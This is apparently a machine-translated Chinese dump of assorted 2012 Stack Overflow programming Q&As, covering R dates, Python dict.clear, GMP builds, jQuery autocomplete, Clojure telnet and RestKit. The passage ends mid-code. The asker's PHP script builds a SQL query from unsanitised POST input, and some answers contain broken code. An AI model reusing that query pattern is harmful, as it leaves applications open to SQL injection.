这是我的示例代码：

```
 WebClient myWebClient = new WebClient();
        Response.Write(myWebClient.DownloadString(@"http://www.otherwebsite.com:11111/json.aspx")); 
```

然后我收到一个错误，启用连接到远程服务器，但如果我删除代理它可以访问并将 json 返回给我。

有什么资料提供给我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T10:18:51.363

删除 URL 中的端口号后，您得到了有效的响应。这表明 Web 服务器正在侦听端口 80 而不是端口号 11111

# r - 如果缺少日期值，如何将字符串日期转换为日期类

> ID：10446833
> 
> 赞同：8
> 
> 时间：2012-05-04T10:13:15.060
> 
> 标签：r, date

我正在尝试将以下日期转换为 R 中的时间类。由于某种原因，当不包括日期值时，我会返回 NA。如果可能的话，我希望能够按原样处理这个字符向量，而不必粘贴任意日期值。谢谢你的帮助。

```
TS <- c("2004-12", "2005-01", "2005-02", "2005-03", "2005-04", "2005-05", 
"2005-06", "2005-07", "2005-08", "2005-09", "2005-10", "2005-11", 
"2005-12", "2006-01", "2006-02", "2006-03", "2006-04", "2006-05", 
"2006-06", "2006-07", "2006-08")
TSd <- paste(TS, "01", sep="-")

#doesn't work
as.Date(TS, format="%Y-%m")
as.POSIXlt(TS, format="%Y-%m")

#works
as.Date(TSd, format="%Y-%m-%d")
as.POSIXlt(TSd, format="%Y-%m-%d") 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-05-04T10:40:46.327

`as.yearmon`从`zoo`包中尝试：

```
library(zoo)
# as.yearmon(TS, "%Y-%m")
as.yearmon(TS)
#  [1] "Dec 2004" "Jan 2005" "Feb 2005" "Mar 2005" "Apr 2005" "May 2005" "Jun 2005"
#  [8] "Jul 2005" "Aug 2005" "Sep 2005" "Oct 2005" "Nov 2005" "Dec 2005" "Jan 2006"
# [15] "Feb 2006" "Mar 2006" "Apr 2006" "May 2006" "Jun 2006" "Jul 2006" "Aug 2006"

as.Date(as.yearmon(TS))
##  [1] "2004-12-01" "2005-01-01" "2005-02-01" "2005-03-01" "2005-04-01"
##  [6] "2005-05-01" "2005-06-01" "2005-07-01" "2005-08-01" "2005-09-01"
## [11] "2005-10-01" "2005-11-01" "2005-12-01" "2006-01-01" "2006-02-01"
## [16] "2006-03-01" "2006-04-01" "2006-05-01" "2006-06-01" "2006-07-01"
## [21] "2006-08-01"

format(as.Date(as.yearmon(TS)), "%Y-%m")
##  [1] "2004-12" "2005-01" "2005-02" "2005-03" "2005-04" "2005-05" "2005-06"
##  [8] "2005-07" "2005-08" "2005-09" "2005-10" "2005-11" "2005-12" "2006-01"
## [15] "2006-02" "2006-03" "2006-04" "2006-05" "2006-06" "2006-07" "2006-08" 
```

# xml - 通过 XSLT 从 XML 中删除十六进制值

> ID：10446835
> 
> 赞同：0
> 
> 时间：2012-05-04T10:13:32.780
> 
> 标签：xml, xslt, ssis

我必须通过 SSIS 将 XML 数据加载到 SQL Server 中，在 XML 源中我得到一些十六进制符号，所以当我将该文件作为 SSIS 中的源时，它不接受十六进制值，我该如何解析或删除那些（十六进制符号）。

错误：字符 ' '，十六进制值 0x2 在 XML 文档中是非法的。

有什么方法可以删除那些使用 XSLT 的，如果有，请让我以正确的方式。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T12:26:31.257

> 错误：字符 ' '，十六进制值 0x2 在 XML 文档中是非法的。
> 
> 有什么方法可以删除那些使用 XSLT 的，如果有，请让我以正确的方式。

不，这是一个 XML 解析器问题，而不是 XSLT 问题。XSLT 处理器只能看到它使用的特定 XML 解析器解析 XML 文档的结果。

因此，如果使用的 XSLT 处理器允许使用不同的 XML 解析器，并且您可以找到使用 XML 1.1 解析器的方法，那么只需设置 XSLT 处理器以使用这个特定的解析器。

在 XSLT 3.0（仍然是一个工作草案）中可能有一个函数可以接受原始文本并将其解析为 XML 文档/片段。这样的函数可能有一个参数，即要使用哪种类型的 XML 解析器——XML 1.0 或 XML 1.1。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T10:22:57.643

您的问题是 XML 本身不允许控制字符，即使编码为字符实体也是如此。XSLT 也无法解析它。

XML 1.1 应该能够将字符作为实体包含在内，但不能作为文本包含在内。

请参阅[“无效的 XML 文件？”](https://stackoverflow.com/questions/696424/invalid-xml-file) 和类似问题的[“XML 任务错误消息十六进制无效字符”](https://stackoverflow.com/questions/3584711/xml-task-error-message-hexadecimal-invalid-character)。

# android - 如何在 PagerTitleStrip 中为 View 寻呼机设置标题

> ID：10446838
> 
> 赞同：2
> 
> 时间：2012-05-04T10:13:44.967
> 
> 标签：android, android-viewpager

我在使用 PagerTitleStrip 设置标题视图寻呼机时遇到问题。我在视图寻呼机中添加了 PagerTitleStrip 的子视图。

我在哪里可以提供标题字符串以应用于每个页面？

如何在 Page Adapter 类中设置页面标题？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-16T09:44:05.730

覆盖 getPageTitle 方法并向其提供页面字符串的静态数组。

```
String [] titlesArray = 
    new String []{ 
        page1, 
        page2,
        page3
    };

public CharSequence getPageTitle(int position) {
    return titlesArray [position];
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-01-05T03:12:58.307

这是完整的示例。你必须实施`public CharSequence getPageTitle(int position)`.

```
public class ViewPagerAdapter extends FragmentPagerAdapter {
    private final List<Fragment> mFragmentList = new ArrayList<>();

    public ViewPagerAdapter(FragmentManager manager) {
        super(manager);
    }

    @Override
    public int getCount() {
        return mFragmentList.size();
    }

    public void addFragment(Fragment fragment) {
        mFragmentList.add(fragment);
    }

     @Override
    public Fragment getItem(int position) {
        if(position == 0){
            return FragmentInner1.newInstance();
        }
        else {
            return FragmentInner2.newInstance();
        }
    }

    @Override
    public CharSequence getPageTitle(int position) {
        if(position == 0){
            // public static final String PAGE_TITLE = "My Title #1" is within the layout FragmentInner1;
            return FragmentInner1.PAGE_TITLE;
        }
        else {
            // public static final String PAGE_TITLE = "My Title #2" is within the layout FragmentInner2;
            return FragmentInner2.PAGE_TITLE;
        }
    }
} 
```

# python - 字典的 clear() 方法是否会从内存中删除所有与项目相关的对象？

> ID：10446839
> 
> 赞同：39
> 
> 时间：2012-05-04T10:13:50.847
> 
> 标签：python, memory, dictionary

如果字典包含可变对象或自定义类的对象（例如查询集，甚至是 DateTime），那么调用`clear()`字典会从内存中删除这些对象吗？它的行为与遍历 dict 和`del`eting 的行为是否不同？

例如。考虑

```
class MyClass(object):
    '''Test Class.'''

my_obj_1 = MyClass()
my_obj_2 = MyClass()

my_dict = { 'foo' : my_obj_1, 'bar' : my_obj_2 } 
```

然后是

```
my_dict.clear() 
```

如同

```
for key in my_dict.keys():
    del my_dict[key] 
```

?

* * *

## 回答 #1

> 赞同：64
> 
> 时间：2012-05-04T11:29:22.267

[dicts 上的 Python 文档](http://docs.python.org/library/stdtypes.html?highlight=dict#dict)指出，在`del d[key]`删除每个键`d[key]`的同时从字典`d.clear()`中删除，所以基本上它们的行为是相同的。

关于内存问题，在 Python 中，当您“删除”时，您基本上是在删除对对象的引用。当一个对象没有被任何变量或其他对象引用或变得无法访问时，它就会变成**垃圾**并且可以从内存中删除。Python 有一个垃圾收集器，它会*不时*检查哪些对象是垃圾并释放为它们分配的内存。如果您从字典中删除的对象被其他变量引用，那么它仍然是可访问的，因此它不是垃圾，因此不会被删除。如果您有兴趣阅读有关垃圾收集的一般信息，特别是 python 的垃圾收集，我会给您留下一些链接。

*   [http://en.wikipedia.org/wiki/Garbage_collection_(computer_science)](http://en.wikipedia.org/wiki/Garbage_collection_(computer_science))
*   [http://www.digi.com/wiki/developer/index.php/Python_Garbage_Collection](http://www.digi.com/wiki/developer/index.php/Python_Garbage_Collection)
*   [http://www.doughellmann.com/PyMOTW/gc/](http://www.doughellmann.com/PyMOTW/gc/)
*   [http://docs.python.org/library/gc.html](http://docs.python.org/library/gc.html)

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2015-05-29T01:55:24.947

事实上，两者之间存在非常小的差异。`clear()`将释放字典中使用的哈希集的内存，而删除密钥则不会。

```
a = dict.fromkeys(range(1000))

In [10]: sys.getsizeof(a)
Out[10]: 49432

In [11]: a.clear()

In [12]: sys.getsizeof(a)
Out[12]: 280

In [13]: a = dict.fromkeys(range(1000))

In [14]: for i in range(1000):
   ....:     del a[i]
   ....:     

In [15]: sys.getsizeof(a)
Out[15]: 49432 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2014-06-06T19:39:02.530

> 它的行为与遍历 dict 和`del`eting 的行为是否不同？

这里值得注意的是，任何实现`MutableMapping`抽象基类的自定义类都可以`clear()`作为“免费”的 mixin 方法。

为了实例化子`MutableMapping`类，您需要重写的唯一方法是：

```
__getitem__, __setitem__, __delitem__, __iter__, __len__ 
```

由于您可以以任何您喜欢的方式将数据存储在映射类中，唯一`clear()`可以弄清楚如何实际清除数据的方法是使用这五种方法中的一种或多种。现在，您可能已经猜到使用了哪些方法`clear()`，但为什么要猜测我们什么时候可以进行实验呢？

```
import collections

class MyMap(collections.MutableMapping):
    def __init__(self, mydict):
        self._top_secret_data = mydict

    def __getitem__(self, key):
        print 'getitem'
        return self._top_secret_data[key]

    def __setitem__(self, key, value):
        raise Exception('where did you want that?')

    def __len__(self):
        raise Exception('a gentleman never tells')

    def __delitem__(self, key):
        print '[shredding intensifies]'
        del self._top_secret_data[key]

    def __iter__(self):
        def keygen():
            for key in self._top_secret_data:
                print 'faster! faster!'
                yield key
        return iter(keygen()) 
```

使用上面定义的类，很容易看出`clear()`是如何实现的：

```
>>> m = MyMap({1:'a', 2:'b', 3:'c'})
>>> m.clear()
faster! faster!
getitem
[shredding intensifies]
faster! faster!
getitem
[shredding intensifies]
faster! faster!
getitem
[shredding intensifies]
>>> 
```

也就是说，`clear()`mixin 方法基本实现为`for key in self: del self[key]`.

现在，免责声明：内置类型，例如`dict`在 C 中实现，因此该`dict.clear`方法可能与`for key in mydict: del mydict[key]`. 我希望在幕后进行一些优化，也许是一种完全不同的策略 - 但希望这个示例能让您了解如何*期望*一种`clear()`方法在 Python 中工作。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-05-04T10:17:03.140

它与调用相同`del d['foo']`- 它只是删除条目，但不会影响键或值本身。

当然，如果没有其他对它们的引用，它们可能会变成垃圾回收。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-04T11:04:53.090

在您的情况下，这两个`MyClass`对象是共享的。它们仍然可以通过`my_obj_1`和访问`my_obj_2`。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2016-01-20T09:24:10.607

del 命令删除列表中特定项目的引用， clear 命令清除所有键值对，因此功能相同，它们都取消引用和从内存中删除它的其余任务由垃圾收集器完成

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2019-05-05T07:09:44.817

您是否尝试过运行代码？以下 Python 3.7 代码引发异常！**“RuntimeError：迭代期间字典大小改变”**：

```
for key in my_dict.keys():
    del my_dict[key] 
```

以前的所有答案都很好。我只是想补充几点关于 del 和 clear 的区别：

1.  **my_dict.clear();** 删除字典中的所有项目并使其等效于空字典。注意：您仍然可以根据需要添加项目！
2.  **del my_dict;** 使 my_dict 的对象被删除并且垃圾收集合格（my_dict 不再可用）！因此，如果您尝试添加/访问任何项目，那么您将获得异常。
3.  此外，您还声明了两个变量 my_obj_1 和 my_obj_2；即使您删除/清除 my_dict，这两个变量也持有对 MyClass 对象的引用，并且在 my_obj_1 和 my_obj_2 超出范围之前不会消失；所以，如果 MyClass 对象持有内存（比如列表或其他东西），那么如果您的意图是通过删除/清除 my_dict 来释放内存，它就不会发生！

    class MyClass(object): '''测试类。'''

    my_obj_1 = MyClass() my_obj_2 = MyClass()

# c - 安装了gmp但看不到

> ID：10446843
> 
> 赞同：4
> 
> 时间：2012-05-04T10:14:12.777
> 
> 标签：c, linux, gcc, gmp

要编译我自己的 gcc，我需要[gmp](http://gmplib.org/)。因此，我下载了一个 gmp 压缩包，并按照通常的 configure、make 和 make install 步骤进行安装。但是，之后，我通过输入“which gmp”在我的系统中看不到任何 gmp。所以我的问题是 gmp 隐藏在哪里？我正在使用 CentOS 5.6。

## 编辑

好的，我可以在/usr/local/include和/usr/local/lib中看到gmp的头文件和库文件。我用过`--with-gmp-include=/usr/local/include --with-gmp-lib=/usr/local/lib`，但 gcc 的配置仍然抱怨找不到 gmp。这里发生了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-11T19:09:32.853

尝试改变

> --with-gmp=

至

> --with-gmp-prefix=

感[谢杜伯](http://nosemaj.org/debian-gcc-4-7)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T11:01:18.617

我认为您应该使用一些参数运行 ./configure 脚本：

```
./configure --prefix=/usr 
```

默认前缀是 /usr/local

如果您的系统是 64 位的：

```
./configure --prefix=/usr --libdir=/usr/lib64 
```

之后，'make && make install' 应该将所有东西安装在适当的位置。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-08T11:07:04.917

你是对的，你需要`--with-gmp-xxx`开关。

`/usr/local/lib`如果 gmp 不在默认运行时链接器位置，您可能还需要设置设置运行路径到或安装 gmp 的任何位置：

```
$ export LD_RUN_PATH=/usr/local/lib
$ configure ...
$ make ... 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-04-17T09:21:42.443

这里的关键点仅在一个传递的评论（@Mat）中提到是 gmp**是一个 library**。它不是二进制文件。所以产生的资源`libgmp*`是`$prefix/lib`.

没有`$prefix/bin/gmp`...

# gwt - 重新绑定错误 - EventBus 不能是抽象的？

> ID：10446847
> 
> 赞同：2
> 
> 时间：2012-05-04T10:14:17.390
> 
> 标签：gwt, gwt-platform

在我从 GWTP 0.6 迁移到 0.7 并使用 GWT 2.4.0 后，我的应用程序抛出了这个错误：

```
[ERROR] Errors in 'generated://3764751F8FC990F2E5309A61EC6876AD/com/mygwtapp/client/gin/ClientGinjectorImpl.java'
      [ERROR] Line 1015:  Rebind result 'com.google.gwt.event.shared.EventBus' cannot be abstract 
```

虽然我已经确保 Maven 中的 GWTP 依赖项是 0.7 版 jar 以及 WEB-INF/lib 文件夹中的那些

我还更改`EventBus`了代码中的所有引用：

从：

```
import com.google.gwt.event.shared.EventBus; 
```

到：

```
import com.google.web.bindery.event.shared.EventBus; 
```

可能是什么问题呢？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-04T20:28:37.653

确保您`gwtp-all-0.6.jar`的类路径/依赖项中不再有。还要确保您替换了**所有**引用`com.google.gwt.event.shared.EventBus`并最终检查该[问题](http://code.google.com/p/gwt-platform/issues/detail?id=397)。

# oracle - 在 oracle 中创建物化视图永远

> ID：10446848
> 
> 赞同：2
> 
> 时间：2012-05-04T10:14:22.220
> 
> 标签：oracle, oracle11g

我有以下查询，其中包含在 5 秒内返回数据的选择查询。但是当我在前面添加创建物化视图命令时，查询需要创建物化视图。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-04T10:32:57.273

当您创建物化视图时，实际上是创建了 Oracle 负责保持同步的数据的副本（它使这些视图有点像索引）。如果您的视图对大量数据或来自其他服务器的数据进行操作，那么创建此视图自然会花费一些时间。

来自[docs.oracle.com](http://docs.oracle.com/cd/B10501_01/server.920/a96567/repmview.htm)：

> 物化视图是来自单个时间点的目标母版的副本。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T11:31:30.927

只为“yuks”，尝试创建表 temp_tab nologging as select ...

我已经看到由于某种原因，MV 创建时间很长的情况，可能是日志记录。

此外，查询开发工具有时会立即开始将数据返回到屏幕，但如果您“分页”到最后一行，您会发现获取所有数据真正需要多长时间。

您应该使用解释计划分析 select 语句，并了解运行时的表基数、索引、等待状态……以便查看查询是否需要调整。

# iphone - 使用 for loop -objective c 动态添加图像

> ID：10446851
> 
> 赞同：1
> 
> 时间：2012-05-04T10:14:36.230
> 
> 标签：iphone, objective-c, nsstring

我正在使用下面的代码在单个单元格内容视图中添加图像数量。

```
 cell.imageView1.image = [UIImage imageNamed:@"testImg1"];
            cell.imageView2.image = [UIImage imageNamed:@"testImg2"];
            cell.imageView3.image = [UIImage imageNamed:@"testImg3"];
            cell.imageView4.image = [UIImage imageNamed:@"testImg4"];
            cell.imageView5.image = [UIImage imageNamed:@"testImg5"];  
.............................  
............................  
cell.imageView20.image = [UIImage imageNamed:@"testImg20"]; 
```

如何使用 for 循环和 stringWithFormat 使我的代码看起来简洁，例如：

```
for(imageCounter = 1; imageCounter <21, imageCounter++)  
{  
cell.imageView(imageCounter).image = [UIImage imageNamed:@"testImg(imageCounter)"];  
} 
```

有什么建议吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T10:34:55.937

要到达循环内不同图像视图的引用，您必须将它们放在数组中或标记它们，而不是您可以去：

```
 NSArray *cellImageViews;
  for(int imageCounter = 1; imageCounter < 21; imageCounter++)
  {
    [[cellImageViews objectAtIndex:imageCounter-1] setImage:[UIImage imageNamed:[NSString stringWithFormat:@"testImg%d", imageCounter]]];
  } 
```

或者

```
 for(int imageCounter = 1; imageCounter <21; imageCounter++)
  {
    [((UIImageView *)[cell viewWithTag:imageCounter]) setImage:[UIImage imageNamed:[NSString stringWithFormat:@"testImg%d", imageCounter]]];
  } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T10:23:49.450

```
UIImageView *img[20];//ur array of images

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{

for (int i=0; i<20; i++) {

        //set frame  every time as ur requirement

        img[i].image = [UIImage imageNamed:[NSString stringWithFormat:@"testImg%d",i+1]];
        [cell.contentView addSubview:img[i]];
    }
} 
```

我认为这段代码可以完美地 [用于更多示例](http://www.appsfor2012.com/2012/07/iphone-questions.html)以获得更好的描述。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-04T10:26:36.360

您使用了错误的逻辑。不能这样使用。而不是这样

```
for(imageCounter = 1; imageCounter <21, imageCounter++)
{
 cell.imageView(imageCounter).image = [UIImage imageNamed:@"testImg%d,(imageCounter)"];
} 
```

你应该使用这个： -

```
yourImageView = [[UIImageView alloc] initWithFrame:CGRectMake(x, y, width, height)];

for(imageCounter = 1; imageCounter <21, imageCounter++)
{
 [yourImageView setImage:[UIImage imageNamed:@"testImg%d",imageCounter]];
 cell.imageView = yourImageView;
} 
```

试试这个。希望它会帮助你谢谢:)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-04T10:39:19.947

嗨，您应该首先将所有图像放在 cellForRowAtIndexPath 方法中的数组中

```
NSMutableArray *imageArr=[[NSMutableArray alloc]initWithObject:cell.imageView1,cell.imageView2.....]; 
```

然后执行以下操作：

```
for(imageCounter = 1; imageCounter <21, imageCounter++) {

[imageArr objectAtindex:imageCounter].image = [UIImage imageNamed:[NSString stringwithformat:@"testImg%d", imageCounter]];
} 
```

如果您需要任何澄清，请告诉我

# events - UIScrollView中的UIWebView,UIScrollView如何获取Tap事件

> ID：10446853
> 
> 赞同：2
> 
> 时间：2012-05-04T10:14:45.543
> 
> 标签：events, uiwebview, uiscrollview, tap

现在，我在 uiscrollview 中有一个 UIWebview，我想检测 uiscrollview 上的单击，但我不知道要实现它！太无聊了！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-04T01:09:42.443

我强烈建议为您的滚动视图使用 MGBox2 控件[https://github.com/sobri909/MGBox2](https://github.com/sobri909/MGBox2)。他们有一个很好的滚动视图包装器，可以轻松地为滚动视图及其内容公开点击事件。

您可以将 UIWebview 放在 MGBox 中，并将 MGBox 添加到 MGScrollView。

然后它将像这样工作：

```
myScrollView.onTap =^{[self doThisOnTap];}; 
```

# php - jquery autcomplete 返回源数组

> ID：10446858
> 
> 赞同：0
> 
> 时间：2012-05-04T10:15:03.147
> 
> 标签：php, jquery, jquery-autocomplete

我正在使用 jquery 的 ajax 函数从外部 php 文件中获取数据。从 php 文件返回的数据将用于自动完成功能。但是，它不是自动完成函数从 php 文件中的数组中建议每个特定值，而是返回所有这些值。我的 jquery 看起来像这样。

```
jQuery('input[name=past_team]:radio').click(function(){
            $('#shadow').fadeIn('slow');
            $('#year').fadeIn('slow');

            var year = $('#year').val();

            $('#year').change(function () {
                $('#shadow').val('');

                $.ajax({  
                    type: "POST",  
                    url: "links.php",  
                    data: ({
                        year: year,
                        type: "past_team"
                    }),
                    success: function(data)      
                    {
                        var data = [data];

                        $("#shadow").autocomplete({ 
                            source: data
                        });
                    }
                });
            });
        }); 
```

link.php 文件如下所示：

```
 <?php
session_start();
require_once("functions.php");
connect();

$type = $_POST['type'];
$year = $_POST['year'];

if($type == "past_team")
{
    $funk   =   mysql_query("SELECT * FROM past_season_team_articles WHERE year = '".$year."'")or die(mysql_error());
    $count  =   mysql_num_rows($funk);
    $i      =   0;

    while($row = mysql_fetch_assoc($funk))
    {
        $name[$i]   =   $row['team'];

        $i++;
    }

    $data = "";

    for($i=0;$i<$count;$i++)
    {
        if($i != ($count-1))
        {
            $data .= '"'.$name[$i].'", ';
        } else
        {
            $data .= '"'.$name[$i].'"';
        }
    }

    echo $data;
}
?> 
```

自动完成工作。但是，只是当我开始在输入字段中输入内容时，加载的建议是整个数组。我会得到“芝加哥小熊队”，“波士顿红袜队”，“亚特兰大勇士队”，......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T10:23:39.917

使用 ie Json 在 php 脚本中呈现您的输出。ATM 不会被 JavaScript 解析，仅与“，”连接到单个数组元素。我不认为那是你想要的。还要注意数据所需的数据结构。

有关工作示例（在客户端，请参阅远程 JSONP 示例[http://jqueryui.com/demos/autocomplete/#remote-jsonp](http://jqueryui.com/demos/autocomplete/#remote-jsonp)）

# playframework - Play framework 2.x 简洁模板国际化

> ID：10446859
> 
> 赞同：4
> 
> 时间：2012-05-04T10:15:04.083
> 
> 标签：playframework, playframework-2.0

有谁知道比以下更简洁的国际化方式：

```
<h2>@Messages.get("Title")</h2> 
```

Play 1.x 的精神：

```
<h2>&{'Title'}</h2> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-04T10:24:13.640

这是标准的方式。您可以创建自己的标签：

```
//file: I.scala.html under views.tags

@(key: String)

@Messages.get(key) 
```

然后像这样使用它

```
@import tags._  //to import tags, only once per template

@I("my.key") 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-10T18:05:21.690

根据[Pere Villega](https://stackoverflow.com/users/116791/pere-villega)的回答，我创建了一个小标签文件来支持消息参数。

`i.scala.html`（因为我不相信大写`i`的 s）：

```
@(key: String, args:String*)@Messages(key, args:_*) 
```

该文件的内容在单行上，并且在 html 部分中不包含任何空格，因为否则会包含换行符并且可能会破坏某些内容，或者至少会使生成的代码变得丑陋且难以阅读。
它可以这样使用：`@i("my.key", value1, value2)`.

* * *

另一个标签 ,`hi.scala.html`用于包含 html 的消息：

```
@(key: String, args:String*)@Html(Messages(key, args:_*)) 
```

# clojure - clojure 中的远程登录

> ID：10446865
> 
> 赞同：1
> 
> 时间：2012-05-04T10:15:12.457
> 
> 标签：clojure, telnet

我是 Clojure 的新手，需要一个简单的示例来在给定端口上创建与 IP 的连接（实际上是现成的系统通过 TELNET 连接到该端口）。向此连接发送一些字符，接收响应并显示（解释）结果。

有人可以通过代码显示，使用上述连接进行远程登录。提前致谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-04T11:00:56.083

最好的办法是使用 clojure 的[java interop](http://clojure.org/java_interop)来包装现有的 telnet 客户端库

Apache [commons-net](http://commons.apache.org/net/)将是一个很好的第一站。 [有一个 telnet 客户端的示例（在 java 中）](http://www.java2s.com/Code/Java/Network-Protocol/ExampleofuseofTelnetClient.htm)应该可以直接移植

例如，您经常会发现使用 clojure java interop 在 java! 中对其进行编码更容易。

```
// from TelnetClientExample

tc = new TelnetClient();

TerminalTypeOptionHandler ttopt = new TerminalTypeOptionHandler("VT100", false, false, true, false);
EchoOptionHandler echoopt = new EchoOptionHandler(true, false, true, false);
SuppressGAOptionHandler gaopt = new SuppressGAOptionHandler(true, true, true, true); 
```

在clojure中看起来像这样：

```
(ns telnet.core
  (:import [org.apache.commons.net.telnet TelnetClient TelnetNotificationHandler SimpleOptionHandler EchoOptionHandler TerminalTypeOptionHandler SuppressGAOptionHandler InvalidTelnetOptionException]))

(def tc 
  (doto (TelnetClient.)
    (.addOptionHandler (TerminalTypeOptionHandler. 
                           "VT100" false false true false))
    (.addOptionHandler (EchoOptionHandler. 
                           true false true false))
    (.addOptionHandler (SuppressGAOptionHandler. 
                           true true true)))) 
```

# regex - 识别等价的正则表达式

> ID：10446868
> 
> 赞同：4
> 
> 时间：2012-05-04T10:15:30.567
> 
> 标签：regex

我正在为上午考试复习，其中一个主题是正则表达式。

过去的试卷有问题

> 以下哪个正则表达式是等价的？解释你的推理。[8分]
> 
> (i) (a+b)* b (a+b)* b (a+b)*
> 
> (二) a* ba* ba*
> 
> (iii) a* ba* b (a+b)*

我认为这是一个棘手的问题，答案是否定的，因为

我会接受 aabaabaabaabbaabaabaabaabbaabaabaabaab 但 ii 和 iii 不会

那么因为 ii 只能接受 2 b 的最大值，而 iii 可以接受 2 b 的最小值。

我是对的还是我完全错了？

我已经通过电子邮件向我的讲师寻求帮助，但没有回复，所以我希望这里有人可以提供帮助。

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-04T10:33:37.650

`i`并且`iii`是等价的。

正则表达式都是“一串`a`s 和`b`至少有两个`b`s 的 s”（这在每个定义中都应该很清楚）。`iii`仅用`a*`s 代替前两个的事实`(a+b)*`令人分心。我将分解如何`iii`描述字符串：

*   一个可能为空的`a`s 字符串（`A`在下面的标签中）
*   第一个`b` ( `X`)
*   另一个可能为空的`a`s ( `B`)字符串
*   一秒钟`b`( `Y`)
*   其余的字符串只是`a`s 和`b`s ( `C`)的混合

对于您的示例，`iii`确实匹配它。想象一下我们这样标记正则表达式（`v`和`^`只是箭头）：

```
A  X B  Y   C
vv v vv v vvvvvv 
a* b a* b (a+b)* 
```

然后我们可以标记正则表达式的哪一部分对应于字符串的各个部分：

```
 X  Y
  v  v
aabaabaabaabbaabaabaabaabbaabaabaabaab
^^ ^^ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
A   B            C 
```

（@Li-aungYip 的建议也不错。）

# java - Java 解压 implode 方法打包的压缩包

> ID：10446871
> 
> 赞同：2
> 
> 时间：2012-05-04T10:15:53.407
> 
> 标签：java, zip, implode, compression

我需要创建一些使用非常旧的内爆方法压缩的 ZIP 档案的软件。

试图编写解压缩器，但没有发生任何好事。优化的 C 代码对我来说非常困难。找到了这个 C 实现（[here](http://www.opensource.apple.com/source/zip/zip-6/unzip/unzip/explode.c)），但无法在 Java 上编写它。刚刚在 Apache-commons 中找到了关于此功能的请求（[JIRA](https://issues.apache.org/jira/browse/COMPRESS-115)包含指向 APPNOTES.TXT 的链接以及方法描述）。

我应该为此方法编写跨平台解压缩器。Perfect 是本机 Java 实现。寻求帮助。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-01-09T08:10:26.913

从 1.7 版开始，Apache Commons Compress 可以解压缩 imploded 和 shrunk zip 条目。这是该算法的纯 Java 实现。

[http://commons.apache.org/compress/](http://commons.apache.org/compress/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T12:14:13.720

如果[TrueZip](http://truezip.java.net/)支持这些旧格式，您是否尝试过？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-07T13:32:14.837

[Sevenzipjbinding](http://sevenzipjbind.sourceforge.net/) - 7-Zip-JBinding 是 7-Zip C++ 库的 java 包装器。它允许使用非常快速的本机库直接从 java 通过 JNI 提取许多存档格式。

# ios - 更新 RestKit：loadObjectsAtResourcePath：usingBlock：不要将对象保存在缓存中

> ID：10446872
> 
> 赞同：3
> 
> 时间：2012-05-04T10:15:57.390
> 
> 标签：ios, restkit

我在一个使用 RestKit 的项目中。在我们决定升级到 0.10.0 之前，我们一直使用 0.9.2 版本。在我的代码进行了一些小改动以使其与新版本的 RestKit 兼容后，我在使用 loadObjectsAtResourcePath: usingBlock: 时发现了一个错误。当我在委托中收到带有函数 -(void)objectLoader:(RKObjectLoader *)objectLoader didLoadObjects:(NSArray *)objects 的响应时，对象数组具有正确的对象，但它们没有保存在 coreData 的缓存中。如果我尝试通过获取 coreData 来访问它们，我找不到它们。这是我使用的一些代码：

RestKit 的配置：

```
RKObjectManager* objectManager = [RKObjectManager objectManagerWithBaseURL:[NSURL URLWithString:@"http://myweb.com/web/app.php/ws"]];
objectManager.client.requestQueue.showsNetworkActivityIndicatorWhenBusy = NO;
objectManager.objectStore = [RKManagedObjectStore objectStoreWithStoreFilename:@"db.sqlite"];

    RKManagedObjectMapping* boAccount    = [RKManagedObjectMapping mappingForClass:[BOAccount class] inManagedObjectStore:objectManager.objectStore];
boAccount.primaryKeyAttribute        = @"boAccountID";
[boAccount mapKeyPathsToAttributes:  @"id", @"boAccountID",
                                     @"created_at", @"createDate",
                                     @"date_expiration", @"expirationDate",
                                     @"date_billing", @"billingDate",
                                     @"nb_authorized_devices", @"numberOfAuthorizedDevices",
 nil];
[objectManager.mappingProvider addObjectMapping:boAccount];
[objectManager.mappingProvider setMapping:boAccount forKeyPath:@"account"]; 
```

调用 loadObjectsAtResourcePath: usingBlock:

```
[[RKObjectManager sharedManager] loadObjectsAtResourcePath:@"/connection" usingBlock:^(RKObjectLoader *loader){
    RKParams *params= [RKParams params];

    //[params setValue:_password.text forParam:@"password"]; 
    [params setValue:[Encrypt encryptWithPublicKeyMessage:_password.text] forParam:@"password"];
    [params setValue:_email.text forParam:@"email"];
    [params setValue:udid forParam:@"udid"];
    [params setValue:name forParam:@"name"];

    loader.delegate = self;
